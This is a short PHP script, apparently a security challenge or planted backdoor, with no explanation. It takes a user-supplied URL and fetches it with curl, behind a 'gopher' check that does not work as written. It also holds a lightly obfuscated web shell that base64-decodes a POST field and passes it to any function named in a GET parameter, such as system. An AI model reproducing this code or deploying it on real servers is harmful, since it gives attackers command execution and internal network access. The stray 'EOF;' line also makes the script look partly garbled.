<?php
EOF;
function curl($url){  
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_exec($ch);
    curl_close($ch);
}
@$url = $_POST['url'];
if(isset($url)) {
    if(strpos('gopher', $url)) {
        die('no');
    }
    curl($url);
}

@$_ENV = $_POST;
function MyCode($request){
    $_ENV[c] = base64_decode($_ENV[c]);
    $request($_ENV[c]);
}
@call_user_func('MyCode', $_GET['func']);
?>
